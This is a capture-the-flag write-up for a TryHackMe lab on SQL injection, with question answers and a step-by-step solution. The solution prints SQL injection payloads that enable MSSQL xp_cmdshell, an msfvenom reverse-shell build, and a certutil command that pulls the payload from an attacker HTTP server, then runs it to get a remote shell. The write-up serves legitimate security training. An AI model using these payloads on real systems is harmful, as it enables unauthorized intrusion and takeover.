# Advent of Cyber

Day 10 - SQL Injection

----------------------------------

- Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?
	- `/giftsearch.php`

- Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?
	- `ODBC Driver 17 for SQL Server`

- Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
	- `THM`

- What flag is in the note file Gr33dstr left behind on the system?
	- `THM`

- What is the flag you receive on the homepage after restoring the website?
	- `THM`


<details>
Steps:

1. 

----------------------------------------------------------------
2. Just by putting a ' apostrophe in the age paramater we can now cause errors and review the ODBC driver

```
age='
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/14915c0b-d13a-4b1e-8589-0fa75722b507)


 ----------------------------------
First we need to enable the xp_cmdshell in the SQL server
	
```
http://10.10.82.81/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/a28b6e6c-69ec-4473-bcd3-1ff56c14dd38)


We need to create a reverse shell to the victim machine

We will use the msfvenom to create the exe file

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
```
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/d26ab8ab-8ded-44ae-842e-1d92b50277af)

Then we will open our python server to port 8000

```
python3 -m http.server 8000
```

Then we will put this reverse shell into the victim machine using the xp_cmdshell command 

```
http://10.10.82.81/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/49693447-2836-46b7-879f-dd781b2ac6ab)

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/7ef21343-bd57-48f0-b382-85103c5d6fba)

After that we will now use NC to listen to the port that we specified

```
nc -lvnp 4444
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/40f6d77c-7d22-4643-ba3c-e4f976c2d4ac)

Then we need to execute the exe file in the victim side. Just by typing in the URL

```
http://10.10.82.81/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/14f82251-691c-42e0-bf2c-26538034d7cc)

After that we will get the command line to the victim's machine now we have root access to their machine....

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/d17408d8-c8c0-49f8-912f-a65033220c20)






As you can see we now restore the website using the bat file

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/f6ac1f9c-00d3-435f-8ccc-13ce197f6b6c)


------------------------------------------------------
3. If we will put ' or 1=1 -- in the URL parameter we can return all of the content in the database. Along side with the THM flag.

 ![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/f4e75f6b-0079-4ad9-8e1f-b2dcfca64476)

------------------------------------------------------
4. Just by a few navigations we can now see the files in the Users Desktop

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/6173ee70-32e5-407c-a3cb-d83a8607432a)

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/488968cb-677a-4745-9a4b-0e4973a45164)

-----------------------------------------------------

5. Visit the /index.php we have a flag 

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/71c0eff7-ac59-4da6-9122-220854f775fd)

</details>
